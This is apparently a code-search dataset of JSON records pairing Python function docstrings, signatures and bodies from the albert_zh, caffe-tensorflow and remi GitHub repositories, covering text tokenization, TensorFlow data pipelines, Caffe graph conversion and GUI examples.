{"docstring": "\"\"\"Runs basic whitespace cleaning and splitting on a piece of text.\"\"\"\n", "func_signal": "def whitespace_tokenize(text):\n", "code": "text = text.strip()\nif not text:\n  return []\ntokens = text.split()\nreturn tokens", "path": "albert_zh/tokenization.py", "commit_date": "2019-10-03 00:00:00", "repo_name": "brightmart/albert_zh", "stars": 3886, "license": "None", "language": "python", "size": 2095}
{"docstring": "\"\"\"Creates an `input_fn` closure to be passed to TPUEstimator.\"\"\"\n\n", "func_signal": "def input_fn_builder(features, seq_length, is_training, drop_remainder):\n", "code": "all_input_ids = []\nall_input_mask = []\nall_segment_ids = []\nall_label_ids = []\n\nfor feature in features:\n  all_input_ids.append(feature.input_ids)\n  all_input_mask.append(feature.input_mask)\n  all_segment_ids.append(feature.segment_ids)\n  all_label_ids.append(feature.label_id)\n\ndef input_fn(params):\n  \"\"\"The actual input function.\"\"\"\n  batch_size = params[\"batch_size\"]\n\n  num_examples = len(features)\n\n  # This is for demo purposes and does NOT scale to large data sets. We do\n  # not use Dataset.from_generator() because that uses tf.py_func which is\n  # not TPU compatible. The right way to load data is with TFRecordReader.\n  d = tf.data.Dataset.from_tensor_slices({\n      \"input_ids\":\n          tf.constant(\n              all_input_ids, shape=[num_examples, seq_length],\n              dtype=tf.int32),\n      \"input_mask\":\n          tf.constant(\n              all_input_mask,\n              shape=[num_examples, seq_length],\n              dtype=tf.int32),\n      \"segment_ids\":\n          tf.constant(\n              all_segment_ids,\n              shape=[num_examples, seq_length],\n              dtype=tf.int32),\n      \"label_ids\":\n          tf.constant(all_label_ids, shape=[num_examples], dtype=tf.int32),\n  })\n\n  if is_training:\n    d = d.repeat()\n    d = d.shuffle(buffer_size=100)\n\n  d = d.batch(batch_size=batch_size, drop_remainder=drop_remainder)\n  return d\n\nreturn input_fn", "path": "albert_zh/run_classifier_clue.py", "commit_date": "2020-04-02 00:00:00", "repo_name": "brightmart/albert_zh", "stars": 3886, "license": "None", "language": "python", "size": 2095}
{"docstring": "\"\"\"Loads a vocabulary file into a dictionary.\"\"\"\n", "func_signal": "def load_vocab(vocab_file):\n", "code": "vocab = collections.OrderedDict()\nindex = 0\nwith tf.gfile.GFile(vocab_file, \"r\") as reader:\n  while True:\n    token = convert_to_unicode(reader.readline())\n    if not token:\n      break\n    token = token.strip()\n    vocab[token] = index\n    index += 1\nreturn vocab", "path": "albert_zh/tokenization.py", "commit_date": "2019-10-03 00:00:00", "repo_name": "brightmart/albert_zh", "stars": 3886, "license": "None", "language": "python", "size": 2095}
{"docstring": "\"\"\"Checks whether the casing config is consistent with the checkpoint name.\"\"\"\n\n# The casing has to be passed in by the user and there is no explicit check\n# as to whether it matches the checkpoint. The casing information probably\n# should have been stored in the bert_config.json file, but it's not, so\n# we have to heuristically detect it to validate.\n\n", "func_signal": "def validate_case_matches_checkpoint(do_lower_case, init_checkpoint):\n", "code": "if not init_checkpoint:\n  return\n\nm = re.match(\"^.*?([A-Za-z0-9_-]+)/bert_model.ckpt\", init_checkpoint)\nif m is None:\n  return\n\nmodel_name = m.group(1)\n\nlower_models = [\n    \"uncased_L-24_H-1024_A-16\", \"uncased_L-12_H-768_A-12\",\n    \"multilingual_L-12_H-768_A-12\", \"chinese_L-12_H-768_A-12\"\n]\n\ncased_models = [\n    \"cased_L-12_H-768_A-12\", \"cased_L-24_H-1024_A-16\",\n    \"multi_cased_L-12_H-768_A-12\"\n]\n\nis_bad_config = False\nif model_name in lower_models and not do_lower_case:\n  is_bad_config = True\n  actual_flag = \"False\"\n  case_name = \"lowercased\"\n  opposite_flag = \"True\"\n\nif model_name in cased_models and do_lower_case:\n  is_bad_config = True\n  actual_flag = \"True\"\n  case_name = \"cased\"\n  opposite_flag = \"False\"\n\nif is_bad_config:\n  raise ValueError(\n      \"You passed in `--do_lower_case=%s` with `--init_checkpoint=%s`. \"\n      \"However, `%s` seems to be a %s model, so you \"\n      \"should pass in `--do_lower_case=%s` so that the fine-tuning matches \"\n      \"how the model was pre-training. If this error is wrong, please \"\n      \"just comment out this check.\" % (actual_flag, init_checkpoint,\n                                        model_name, case_name, opposite_flag))", "path": "albert_zh/tokenization.py", "commit_date": "2019-10-03 00:00:00", "repo_name": "brightmart/albert_zh", "stars": 3886, "license": "None", "language": "python", "size": 2095}
{"docstring": "\"\"\"Decodes a record to a TensorFlow example.\"\"\"\n", "func_signal": "def _decode_record(record, name_to_features):\n", "code": "example = tf.parse_single_example(record, name_to_features)\n\n# tf.Example only supports tf.int64, but the TPU only supports tf.int32.\n# So cast all int64 to int32.\nfor name in list(example.keys()):\n  t = example[name]\n  if t.dtype == tf.int64:\n    t = tf.to_int32(t)\n  example[name] = t\n\nreturn example", "path": "albert_zh/run_classifier_clue.py", "commit_date": "2020-04-02 00:00:00", "repo_name": "brightmart/albert_zh", "stars": 3886, "license": "None", "language": "python", "size": 2095}
{"docstring": "\"\"\"Splits punctuation on a piece of text.\"\"\"\n", "func_signal": "def _run_split_on_punc(self, text):\n", "code": "chars = list(text)\ni = 0\nstart_new_word = True\noutput = []\nwhile i < len(chars):\n  char = chars[i]\n  if _is_punctuation(char):\n    output.append([char])\n    start_new_word = True\n  else:\n    if start_new_word:\n      output.append([])\n    start_new_word = False\n    output[-1].append(char)\n  i += 1\n\nreturn [\"\".join(x) for x in output]", "path": "albert_zh/tokenization.py", "commit_date": "2019-10-03 00:00:00", "repo_name": "brightmart/albert_zh", "stars": 3886, "license": "None", "language": "python", "size": 2095}
{"docstring": "\"\"\"Returns text encoded in a way suitable for print or `tf.logging`.\"\"\"\n\n# These functions want `str` for both Python2 and Python3, but in one case\n# it's a Unicode string and in the other it's a byte string.\n", "func_signal": "def printable_text(text):\n", "code": "if six.PY3:\n  if isinstance(text, str):\n    return text\n  elif isinstance(text, bytes):\n    return text.decode(\"utf-8\", \"ignore\")\n  else:\n    raise ValueError(\"Unsupported string type: %s\" % (type(text)))\nelif six.PY2:\n  if isinstance(text, str):\n    return text\n  elif isinstance(text, unicode):\n    return text.encode(\"utf-8\")\n  else:\n    raise ValueError(\"Unsupported string type: %s\" % (type(text)))\nelse:\n  raise ValueError(\"Not running on Python2 or Python 3?\")", "path": "albert_zh/tokenization.py", "commit_date": "2019-10-03 00:00:00", "repo_name": "brightmart/albert_zh", "stars": 3886, "license": "None", "language": "python", "size": 2095}
{"docstring": "\"\"\"Performs invalid character removal and whitespace cleanup on text.\"\"\"\n", "func_signal": "def _clean_text(self, text):\n", "code": "output = []\nfor char in text:\n  cp = ord(char)\n  if cp == 0 or cp == 0xfffd or _is_control(char):\n    continue\n  if _is_whitespace(char):\n    output.append(\" \")\n  else:\n    output.append(char)\nreturn \"\".join(output)", "path": "albert_zh/tokenization.py", "commit_date": "2019-10-03 00:00:00", "repo_name": "brightmart/albert_zh", "stars": 3886, "license": "None", "language": "python", "size": 2095}
{"docstring": "\"\"\"Checks whether `chars` is a whitespace character.\"\"\"\n# \\t, \\n, and \\r are technically contorl characters but we treat them\n# as whitespace since they are generally considered as such.\n", "func_signal": "def _is_whitespace(char):\n", "code": "if char == \" \" or char == \"\\t\" or char == \"\\n\" or char == \"\\r\":\n  return True\ncat = unicodedata.category(char)\nif cat == \"Zs\":\n  return True\nreturn False", "path": "albert_zh/tokenization.py", "commit_date": "2019-10-03 00:00:00", "repo_name": "brightmart/albert_zh", "stars": 3886, "license": "None", "language": "python", "size": 2095}
{"docstring": "\"\"\"Tokenizes a piece of text into its word pieces.\n\nThis uses a greedy longest-match-first algorithm to perform tokenization\nusing the given vocabulary.\n\nFor example:\n  input = \"unaffable\"\n  output = [\"un\", \"##aff\", \"##able\"]\n\nArgs:\n  text: A single token or whitespace separated tokens. This should have\n    already been passed through `BasicTokenizer.\n\nReturns:\n  A list of wordpiece tokens.\n\"\"\"\n\n", "func_signal": "def tokenize(self, text):\n", "code": "text = convert_to_unicode(text)\n\noutput_tokens = []\nfor token in whitespace_tokenize(text):\n  chars = list(token)\n  if len(chars) > self.max_input_chars_per_word:\n    output_tokens.append(self.unk_token)\n    continue\n\n  is_bad = False\n  start = 0\n  sub_tokens = []\n  while start < len(chars):\n    end = len(chars)\n    cur_substr = None\n    while start < end:\n      substr = \"\".join(chars[start:end])\n      if start > 0:\n        substr = \"##\" + substr\n      if substr in self.vocab:\n        cur_substr = substr\n        break\n      end -= 1\n    if cur_substr is None:\n      is_bad = True\n      break\n    sub_tokens.append(cur_substr)\n    start = end\n\n  if is_bad:\n    output_tokens.append(self.unk_token)\n  else:\n    output_tokens.extend(sub_tokens)\nreturn output_tokens", "path": "albert_zh/tokenization.py", "commit_date": "2019-10-03 00:00:00", "repo_name": "brightmart/albert_zh", "stars": 3886, "license": "None", "language": "python", "size": 2095}
{"docstring": "\"\"\"Checks whether CP is the codepoint of a CJK character.\"\"\"\n# This defines a \"chinese character\" as anything in the CJK Unicode block:\n#   https://en.wikipedia.org/wiki/CJK_Unified_Ideographs_(Unicode_block)\n#\n# Note that the CJK Unicode block is NOT all Japanese and Korean characters,\n# despite its name. The modern Korean Hangul alphabet is a different block,\n# as is Japanese Hiragana and Katakana. Those alphabets are used to write\n# space-separated words, so they are not treated specially and handled\n# like the all of the other languages.\n", "func_signal": "def _is_chinese_char(self, cp):\n", "code": "if ((cp >= 0x4E00 and cp <= 0x9FFF) or  #\n    (cp >= 0x3400 and cp <= 0x4DBF) or  #\n    (cp >= 0x20000 and cp <= 0x2A6DF) or  #\n    (cp >= 0x2A700 and cp <= 0x2B73F) or  #\n    (cp >= 0x2B740 and cp <= 0x2B81F) or  #\n    (cp >= 0x2B820 and cp <= 0x2CEAF) or\n    (cp >= 0xF900 and cp <= 0xFAFF) or  #\n    (cp >= 0x2F800 and cp <= 0x2FA1F)):  #\n  return True\n\nreturn False", "path": "albert_zh/tokenization.py", "commit_date": "2019-10-03 00:00:00", "repo_name": "brightmart/albert_zh", "stars": 3886, "license": "None", "language": "python", "size": 2095}
{"docstring": "'''Yield a batch until no more images are left.'''\n", "func_signal": "def batches(self, session):\n", "code": "for _ in xrange(self.num_batches):\n    yield self.get(session=session)", "path": "caffe-tensorflow/examples/imagenet/dataset.py", "commit_date": "2016-06-22 00:00:00", "repo_name": "ethereon/caffe-tensorflow", "stars": 2809, "license": "other", "language": "python", "size": 1753}
{"docstring": "'''\ndef_path: Path to the model definition (.prototxt)\ndata_path: Path to the model data (.caffemodel)\nphase: Either 'test' or 'train'. Used for filtering phase-specific nodes.\n'''\n", "func_signal": "def __init__(self, def_path, phase='test'):\n", "code": "self.def_path = def_path\nself.phase = phase\nself.load()", "path": "caffe-tensorflow/kaffe/graph.py", "commit_date": "2016-05-26 00:00:00", "repo_name": "ethereon/caffe-tensorflow", "stars": 2809, "license": "other", "language": "python", "size": 1753}
{"docstring": "# Validate the batch size\n", "func_signal": "def setup(self, batch_size, num_concurrent):\n", "code": "num_images = len(self.image_paths)\nbatch_size = min(num_images, batch_size or self.data_spec.batch_size)\nif num_images % batch_size != 0:\n    raise ValueError(\n        'The total number of images ({}) must be divisible by the batch size ({}).'.format(\n            num_images, batch_size))\nself.num_batches = num_images / batch_size\n\n# Create a queue that will contain image paths (and their indices and extension indicator)\nself.path_queue = tf.FIFOQueue(capacity=num_images,\n                               dtypes=[tf.int32, tf.bool, tf.string],\n                               name='path_queue')\n\n# Enqueue all image paths, along with their indices\nindices = tf.range(num_images)\nself.enqueue_paths_op = self.path_queue.enqueue_many([indices, self.extension_mask,\n                                                      self.image_paths])\n# Close the path queue (no more additions)\nself.close_path_queue_op = self.path_queue.close()\n\n# Create an operation that dequeues a single path and returns a processed image\n(idx, processed_image) = self.process()\n\n# Create a queue that will contain the processed images (and their indices)\nimage_shape = (self.data_spec.crop_size, self.data_spec.crop_size, self.data_spec.channels)\nprocessed_queue = tf.FIFOQueue(capacity=int(np.ceil(num_images / float(num_concurrent))),\n                               dtypes=[tf.int32, tf.float32],\n                               shapes=[(), image_shape],\n                               name='processed_queue')\n\n# Enqueue the processed image and path\nenqueue_processed_op = processed_queue.enqueue([idx, processed_image])\n\n# Create a dequeue op that fetches a batch of processed images off the queue\nself.dequeue_op = processed_queue.dequeue_many(batch_size)\n\n# Create a queue runner to perform the processing operations in parallel\nnum_concurrent = min(num_concurrent, num_images)\nself.queue_runner = tf.train.QueueRunner(processed_queue,\n                                         [enqueue_processed_op] * num_concurrent)", "path": "caffe-tensorflow/examples/imagenet/dataset.py", "commit_date": "2016-06-22 00:00:00", "repo_name": "ethereon/caffe-tensorflow", "stars": 2809, "license": "other", "language": "python", "size": 1753}
{"docstring": "# Dequeue a single image path\n", "func_signal": "def process(self):\n", "code": "idx, is_jpeg, image_path = self.path_queue.dequeue()\n# Load the image\nimg = self.load_image(image_path, is_jpeg)\n# Process the image\nprocessed_img = process_image(img=img,\n                              scale=self.data_spec.scale_size,\n                              isotropic=self.data_spec.isotropic,\n                              crop=self.data_spec.crop_size,\n                              mean=self.data_spec.mean)\n# Return the processed image, along with its index\nreturn (idx, processed_img)", "path": "caffe-tensorflow/examples/imagenet/dataset.py", "commit_date": "2016-06-22 00:00:00", "repo_name": "ethereon/caffe-tensorflow", "stars": 2809, "license": "other", "language": "python", "size": 1753}
{"docstring": "'''Decorator for composable network layers.'''\n\n", "func_signal": "def layer(op):\n", "code": "def layer_decorated(self, *args, **kwargs):\n    # Automatically set a name if not provided.\n    name = kwargs.setdefault('name', self.get_unique_name(op.__name__))\n    # Figure out the layer inputs.\n    if len(self.terminals) == 0:\n        raise RuntimeError('No input variables found for layer %s.' % name)\n    elif len(self.terminals) == 1:\n        layer_input = self.terminals[0]\n    else:\n        layer_input = list(self.terminals)\n    # Perform the operation and get the output.\n    layer_output = op(self, layer_input, *args, **kwargs)\n    # Add to layer LUT.\n    self.layers[name] = layer_output\n    # This output is now the input for the next layer.\n    self.feed(layer_output)\n    # Return self for chained calls.\n    return self\n\nreturn layer_decorated", "path": "caffe-tensorflow/kaffe/tensorflow/network.py", "commit_date": "2016-12-26 00:00:00", "repo_name": "ethereon/caffe-tensorflow", "stars": 2809, "license": "other", "language": "python", "size": 1753}
{"docstring": "# The input nodes for this network\n", "func_signal": "def __init__(self, inputs, trainable=True):\n", "code": "self.inputs = inputs\n# The current list of terminal nodes\nself.terminals = []\n# Mapping from layer names to layers\nself.layers = dict(inputs)\n# If true, the resulting variables are set as trainable\nself.trainable = trainable\n# Switch variable for dropout\nself.use_dropout = tf.placeholder_with_default(tf.constant(1.0),\n                                               shape=[],\n                                               name='use_dropout')\nself.setup()", "path": "caffe-tensorflow/kaffe/tensorflow/network.py", "commit_date": "2016-12-26 00:00:00", "repo_name": "ethereon/caffe-tensorflow", "stars": 2809, "license": "other", "language": "python", "size": 1753}
{"docstring": "'''Returns an index-suffixed unique name for the given prefix.\nThis is used for auto-generating layer names based on the type-prefix.\n'''\n", "func_signal": "def get_unique_name(self, prefix):\n", "code": "ident = sum(t.startswith(prefix) for t, _ in self.layers.items()) + 1\nreturn '%s_%d' % (prefix, ident)", "path": "caffe-tensorflow/kaffe/tensorflow/network.py", "commit_date": "2016-12-26 00:00:00", "repo_name": "ethereon/caffe-tensorflow", "stars": 2809, "license": "other", "language": "python", "size": 1753}
{"docstring": "'''Returns the data specifications for the given network.'''\n", "func_signal": "def get_data_spec(model_instance=None, model_class=None):\n", "code": "model_class = model_class or model_instance.__class__\nreturn MODEL_DATA_SPECS[model_class]", "path": "caffe-tensorflow/examples/imagenet/models/helper.py", "commit_date": "2016-06-22 00:00:00", "repo_name": "ethereon/caffe-tensorflow", "stars": 2809, "license": "other", "language": "python", "size": 1753}
{"docstring": "'''Load the layer definitions from the prototxt.'''\n", "func_signal": "def load(self):\n", "code": "self.params = get_caffe_resolver().NetParameter()\nwith open(self.def_path, 'rb') as def_file:\n    text_format.Merge(def_file.read(), self.params)", "path": "caffe-tensorflow/kaffe/graph.py", "commit_date": "2016-05-26 00:00:00", "repo_name": "ethereon/caffe-tensorflow", "stars": 2809, "license": "other", "language": "python", "size": 1753}
{"docstring": "# Read the file\n", "func_signal": "def load_image(self, image_path, is_jpeg):\n", "code": "file_data = tf.read_file(image_path)\n# Decode the image data\nimg = tf.cond(\n    is_jpeg,\n    lambda: tf.image.decode_jpeg(file_data, channels=self.data_spec.channels),\n    lambda: tf.image.decode_png(file_data, channels=self.data_spec.channels))\nif self.data_spec.expects_bgr:\n    # Convert from RGB channel ordering to BGR\n    # This matches, for instance, how OpenCV orders the channels.\n    img = tf.reverse(img, [False, False, True])\nreturn img", "path": "caffe-tensorflow/examples/imagenet/dataset.py", "commit_date": "2016-06-22 00:00:00", "repo_name": "ethereon/caffe-tensorflow", "stars": 2809, "license": "other", "language": "python", "size": 1753}
{"docstring": "'''\nGet a single batch of images along with their indices. If a set of labels were provided,\nthe corresponding labels are returned instead of the indices.\n'''\n", "func_signal": "def get(self, session):\n", "code": "(indices, images) = session.run(self.dequeue_op)\nif self.labels is not None:\n    labels = [self.labels[idx] for idx in indices]\n    return (labels, images)\nreturn (indices, images)", "path": "caffe-tensorflow/examples/imagenet/dataset.py", "commit_date": "2016-06-22 00:00:00", "repo_name": "ethereon/caffe-tensorflow", "stars": 2809, "license": "other", "language": "python", "size": 1753}
{"docstring": "'''\nCreate data input nodes.\n\nThis method is for old-style inputs, where the input specification\nwas not treated as a first-class layer in the prototext.\nNewer models use the \"Input layer\" type.\n'''\n", "func_signal": "def make_input_nodes(self):\n", "code": "nodes = [Node(name, NodeKind.Data) for name in self.params.input]\nif len(nodes):\n    input_dim = map(int, self.params.input_dim)\n    if not input_dim:\n        if len(self.params.input_shape) > 0:\n            input_dim = map(int, self.params.input_shape[0].dim)\n        else:\n            raise KaffeError('Dimensions for input not specified.')\n    for node in nodes:\n        node.output_shape = tuple(input_dim)\nreturn nodes", "path": "caffe-tensorflow/kaffe/graph.py", "commit_date": "2016-05-26 00:00:00", "repo_name": "ethereon/caffe-tensorflow", "stars": 2809, "license": "other", "language": "python", "size": 1753}
{"docstring": "# NOTE: Currently, only inference is supported\n", "func_signal": "def batch_normalization(self, input, name, scale_offset=True, relu=False):\n", "code": "with tf.variable_scope(name) as scope:\n    shape = [input.get_shape()[-1]]\n    if scale_offset:\n        scale = self.make_var('scale', shape=shape)\n        offset = self.make_var('offset', shape=shape)\n    else:\n        scale, offset = (None, None)\n    output = tf.nn.batch_normalization(\n        input,\n        mean=self.make_var('mean', shape=shape),\n        variance=self.make_var('variance', shape=shape),\n        offset=offset,\n        scale=scale,\n        # TODO: This is the default Caffe batch norm eps\n        # Get the actual eps from parameters\n        variance_epsilon=1e-5,\n        name=name)\n    if relu:\n        output = tf.nn.relu(output)\n    return output", "path": "caffe-tensorflow/kaffe/tensorflow/network.py", "commit_date": "2016-12-26 00:00:00", "repo_name": "ethereon/caffe-tensorflow", "stars": 2809, "license": "other", "language": "python", "size": 1753}
{"docstring": "'''Start the processing worker threads.'''\n# Queue all paths\n", "func_signal": "def start(self, session, coordinator, num_concurrent=4):\n", "code": "session.run(self.enqueue_paths_op)\n# Close the path queue\nsession.run(self.close_path_queue_op)\n# Start the queue runner and return the created threads\nreturn self.queue_runner.create_threads(session, coord=coordinator, start=True)", "path": "caffe-tensorflow/examples/imagenet/dataset.py", "commit_date": "2016-06-22 00:00:00", "repo_name": "ethereon/caffe-tensorflow", "stars": 2809, "license": "other", "language": "python", "size": 1753}
{"docstring": "'''Load network weights.\ndata_path: The path to the numpy-serialized network weights\nsession: The current TensorFlow session\nignore_missing: If true, serialized weights for missing layers are ignored.\n'''\n", "func_signal": "def load(self, data_path, session, ignore_missing=False):\n", "code": "data_dict = np.load(data_path).item()\nfor op_name in data_dict:\n    with tf.variable_scope(op_name, reuse=True):\n        for param_name, data in data_dict[op_name].iteritems():\n            try:\n                var = tf.get_variable(param_name)\n                session.run(var.assign(data))\n            except ValueError:\n                if not ignore_missing:\n                    raise", "path": "caffe-tensorflow/kaffe/tensorflow/network.py", "commit_date": "2016-12-26 00:00:00", "repo_name": "ethereon/caffe-tensorflow", "stars": 2809, "license": "other", "language": "python", "size": 1753}
{"docstring": "# Read in the ground truth labels for the validation set\n# The get_ilsvrc_aux.sh in Caffe's data/ilsvrc12 folder can fetch a copy of val.txt\n", "func_signal": "def __init__(self, val_path, data_path, data_spec):\n", "code": "gt_lines = open(val_path).readlines()\ngt_pairs = [line.split() for line in gt_lines]\n# Get the full image paths\n# You will need a copy of the ImageNet validation set for this.\nimage_paths = [osp.join(data_path, p[0]) for p in gt_pairs]\n# The corresponding ground truth labels\nlabels = np.array([int(p[1]) for p in gt_pairs])\n# Initialize base\nsuper(ImageNetProducer, self).__init__(image_paths=image_paths,\n                                       data_spec=data_spec,\n                                       labels=labels)", "path": "caffe-tensorflow/examples/imagenet/dataset.py", "commit_date": "2016-06-22 00:00:00", "repo_name": "ethereon/caffe-tensorflow", "stars": 2809, "license": "other", "language": "python", "size": 1753}
{"docstring": "'''Create a graph node for the given layer.'''\n", "func_signal": "def make_node(self, layer):\n", "code": "kind = NodeKind.map_raw_kind(layer.type)\nif kind is None:\n    raise KaffeError('Unknown layer type encountered: %s' % layer.type)\n# We want to use the layer's top names (the \"output\" names), rather than the\n# name attribute, which is more of readability thing than a functional one.\n# Other layers will refer to a node by its \"top name\".\nreturn Node(layer.name, kind, layer=layer)", "path": "caffe-tensorflow/kaffe/graph.py", "commit_date": "2016-05-26 00:00:00", "repo_name": "ethereon/caffe-tensorflow", "stars": 2809, "license": "other", "language": "python", "size": 1753}
{"docstring": "'''\nBuilds the graph from the Caffe layer definitions.\n'''\n# Get the layers\n", "func_signal": "def build(self):\n", "code": "layers = self.params.layers or self.params.layer\n# Filter out phase-excluded layers\nlayers = self.filter_layers(layers)\n# Get any separately-specified input layers\nnodes = self.make_input_nodes()\nnodes += [self.make_node(layer) for layer in layers]\n# Initialize the graph\ngraph = Graph(nodes=nodes, name=self.params.name)\n# Connect the nodes\n#\n# A note on layers and outputs:\n# In Caffe, each layer can produce multiple outputs (\"tops\") from a set of inputs\n# (\"bottoms\"). The bottoms refer to other layers' tops. The top can rewrite a bottom\n# (in case of in-place operations). Note that the layer's name is not used for establishing\n# any connectivity. It's only used for data association. By convention, a layer with a\n# single top will often use the same name (although this is not required).\n#\n# The current implementation only supports single-output nodes (note that a node can still\n# have multiple children, since multiple child nodes can refer to the single top's name).\nnode_outputs = {}\nfor layer in layers:\n    node = graph.get_node(layer.name)\n    for input_name in layer.bottom:\n        assert input_name != layer.name\n        parent_node = node_outputs.get(input_name)\n        if (parent_node is None) or (parent_node == node):\n            parent_node = graph.get_node(input_name)\n        node.add_parent(parent_node)\n    if len(layer.top)>1:\n        raise KaffeError('Multiple top nodes are not supported.')\n    for output_name in layer.top:\n        if output_name == layer.name:\n            # Output is named the same as the node. No further action required.\n            continue\n        # There are two possibilities here:\n        #\n        # Case 1: output_name refers to another node in the graph.\n        # This is an \"in-place operation\" that overwrites an existing node.\n        # This would create a cycle in the graph. We'll undo the in-placing\n        # by substituting this node wherever the overwritten node is referenced.\n        #\n        # Case 2: output_name violates the convention layer.name == output_name.\n        # Since we are working in the single-output regime, we will can rename it to\n        # match the layer name.\n        #\n        # For both cases, future references to this top re-routes to this node.\n        node_outputs[output_name] = node\n\ngraph.compute_output_shapes()\nreturn graph", "path": "caffe-tensorflow/kaffe/graph.py", "commit_date": "2016-05-26 00:00:00", "repo_name": "ethereon/caffe-tensorflow", "stars": 2809, "license": "other", "language": "python", "size": 1753}
{"docstring": "# The data specifications describe how to process the image\n", "func_signal": "def __init__(self, image_paths, data_spec, num_concurrent=4, batch_size=None, labels=None):\n", "code": "self.data_spec = data_spec\n# A list of full image paths\nself.image_paths = image_paths\n# An optional list of labels corresponding to each image path\nself.labels = labels\n# A boolean flag per image indicating whether its a JPEG or PNG\nself.extension_mask = self.create_extension_mask(self.image_paths)\n# Create the loading and processing operations\nself.setup(batch_size=batch_size, num_concurrent=num_concurrent)", "path": "caffe-tensorflow/examples/imagenet/dataset.py", "commit_date": "2016-06-22 00:00:00", "repo_name": "ethereon/caffe-tensorflow", "stars": 2809, "license": "other", "language": "python", "size": 1753}
{"docstring": "'''Filter out layers based on the current phase.'''\n", "func_signal": "def filter_layers(self, layers):\n", "code": "phase_map = {0: 'train', 1: 'test'}\nfiltered_layer_names = set()\nfiltered_layers = []\nfor layer in layers:\n    phase = self.phase\n    if len(layer.include):\n        phase = phase_map[layer.include[0].phase]\n    if len(layer.exclude):\n        phase = phase_map[1 - layer.include[0].phase]\n    exclude = (phase != self.phase)\n    # Dropout layers appear in a fair number of Caffe\n    # test-time networks. These are just ignored. We'll\n    # filter them out here.\n    if (not exclude) and (phase == 'test'):\n        exclude = (layer.type == LayerType.Dropout)\n    if not exclude:\n        filtered_layers.append(layer)\n        # Guard against dupes.\n        assert layer.name not in filtered_layer_names\n        filtered_layer_names.add(layer.name)\nreturn filtered_layers", "path": "caffe-tensorflow/kaffe/graph.py", "commit_date": "2016-05-26 00:00:00", "repo_name": "ethereon/caffe-tensorflow", "stars": 2809, "license": "other", "language": "python", "size": 1753}
{"docstring": "#refWidget is the target widget that will be resized\n#newParent is the container\n", "func_signal": "def setup(self, refWidget, newParent):\n", "code": "if self.parent:\n    try:\n        self.parent.remove_child(self)\n    except Exception:\n        #there was no ResizeHelper placed\n        pass\nif newParent==None:\n    return\nself.parent = newParent\nself.refWidget = refWidget\ntry:\n    self.parent.append(self)\nexcept Exception:\n    #the selected widget's parent can't contain a ResizeHelper\n    pass\n#self.refWidget.style['position'] = 'relative'\nself.update_position()", "path": "remi/examples/resizable_panes.py", "commit_date": "2020-05-02 00:00:00", "repo_name": "rawpython/remi", "stars": 3442, "license": "apache-2.0", "language": "python", "size": 4459}
{"docstring": "\"\"\"event called pressing on OK button.\n   propagates the string content of the input field\n\"\"\"\n", "func_signal": "def confirm_value(self, widget):\n", "code": "self.hide()\nparams = (self.fileFolderNavigator.pathEditor.get_text(),)\nreturn params", "path": "remi/editor/editor_widgets.py", "commit_date": "2020-11-19 00:00:00", "repo_name": "rawpython/remi", "stars": 3442, "license": "apache-2.0", "language": "python", "size": 4459}
{"docstring": "#creating a container VBox type, vertical\n", "func_signal": "def main(self):\n", "code": "wid = gui.VBox(width=300, height=200)\n\n#creating a text label, \"white-space\":\"pre\" preserves newline\nself.lbl = gui.Label('Hello\\n test', width='80%', height='50%', style={\"white-space\":\"pre\"})\n\n#a button for simple interaction\nbt = gui.Button('Press me!', width=200, height=30)\n\n#setting up the listener for the click event\nbt.onclick.do(self.on_button_pressed)\n\n#adding the widgets to the main container\nwid.append(self.lbl)\nwid.append(bt)\n\n# returning the root widget\nreturn wid", "path": "remi/examples/helloworld_app.py", "commit_date": "2019-04-01 00:00:00", "repo_name": "rawpython/remi", "stars": 3442, "license": "apache-2.0", "language": "python", "size": 4459}
{"docstring": "# margin 0px auto allows to center the app to the screen\n", "func_signal": "def main(self, name='world'):\n", "code": "wid = gui.VBox(width=300, height=200, margin='0px auto')\n\nlbl = gui.Label(\"Close or reload the page, the console thread will stop automatically.\")\nwid.append(lbl)\n\n# add the following 3 lines to your app and the on_window_close method to make the console close automatically\ntag = gui.Tag(_type='script')\ntag.add_child(\"javascript\", \"\"\"window.onunload=function(e){remi.sendCallback('%s','%s');return \"close?\";};\"\"\" % (\n    str(id(self)), \"on_window_close\"))\nwid.add_child(\"onunloadevent\", tag)\n\n# returning the root widget\nreturn wid", "path": "remi/examples/onclose_window_app.py", "commit_date": "2020-05-03 00:00:00", "repo_name": "rawpython/remi", "stars": 3442, "license": "apache-2.0", "language": "python", "size": 4459}
{"docstring": "# I create a unique id for the new label that will be instantiated\n", "func_signal": "def on_add_a_label_pressed(self, emitter):\n", "code": "key = str(len(self.lbls_container.children))\nlbl = gui.Label(\"label id: \" + key, style={'border': '1px solid gray', 'margin': '3px'})\nself.lbls_container.append(lbl, key)", "path": "remi/examples/append_and_remove_widgets_app.py", "commit_date": "2020-04-28 00:00:00", "repo_name": "rawpython/remi", "stars": 3442, "license": "apache-2.0", "language": "python", "size": 4459}
{"docstring": "\"\"\"\nA simple function to make a default svg icon for the widgets\n  such icons can be replaced later with a good one\n\"\"\"\n", "func_signal": "def default_icon(name, view_w=2, view_h=0.6):\n", "code": "icon = gui.Svg(width=100,height=30)\nicon.set_viewbox(-view_w/2,-view_h/2,view_w,view_h)\ntext = gui.SvgText(0,0,name)\ntext.style['font-size'] = \"0.2px\"\ntext.style['text-anchor'] = \"middle\"\nstroke_width = 0.01\nrect = gui.SvgRectangle(-view_w/2+stroke_width,-view_h/2+stroke_width,view_w-stroke_width*2,view_h-stroke_width*2)\nrect.set_fill(\"none\")\nrect.set_stroke(0.01,'black')\nicon.append([rect, text])\nreturn icon", "path": "remi/editor/widgets/__init__.py", "commit_date": "2020-05-02 00:00:00", "repo_name": "rawpython/remi", "stars": 3442, "license": "apache-2.0", "language": "python", "size": 4459}
{"docstring": "\"\"\"Based on https://stackoverflow.com/questions/13503079/how-to-create-a-copy-of-a-python-function\"\"\"\n", "func_signal": "def copy_func(f):\n", "code": "g = types.FunctionType(f.__code__, f.__globals__, name=f.__name__,\n                       argdefs=f.__defaults__,\n                       closure=f.__closure__)\n#g = functools.update_wrapper(g, f)\nif hasattr(f, \"__kwdefaults__\"):\n    g.__kwdefaults__ = f.__kwdefaults__\nreturn g", "path": "remi/editor/editor_widgets.py", "commit_date": "2020-11-19 00:00:00", "repo_name": "rawpython/remi", "stars": 3442, "license": "apache-2.0", "language": "python", "size": 4459}
